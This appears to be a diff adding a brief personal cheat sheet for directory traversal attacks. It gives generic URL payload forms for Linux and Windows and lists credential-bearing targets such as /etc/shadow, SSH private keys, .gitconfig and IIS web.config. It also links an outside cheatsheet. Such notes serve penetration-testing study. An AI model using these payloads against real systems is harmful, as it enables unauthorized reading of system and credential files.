@@ -1,0 +1,22 @@
+Directory Traversal Attack ---> The file related to "service" ---> Sensitive Info (Credentials)
+
+1.Base form for Linux: {URL}?../../../../../{File with sensitive info}
+  Base form for Windows: {URL}?..\..\..\..\{File with sensitive info}
+
+2.The suspect file that may contain Credentials:
+2-1.Linux:
+./etc/passwd (x:1000:1000 is for user)
+./etc/shadow
+./home/{user_name}/.ssh/id_rsa
+./home/{user_name}/.bashrc
+./home/{user_name}/.profile
+./etc/{file name}
+./home/{user_name}/.gitconfig (This file contains the git config info)
+
+2-2.Windows:
+.\Windows\SYSTEM32\Drives\etc\hosts
+.Another Windows file disclosure list web:
+https://gist.github.com/SleepyLctl/823c4d29f834a71ba995238e80eb15f9#file-windows-path-traversal-cheatsheet
+.IIS Server:
+*C:\inetpub\logs\LogFiles\W3SVC1
+*C:\inetpub\wwwroot\web.config
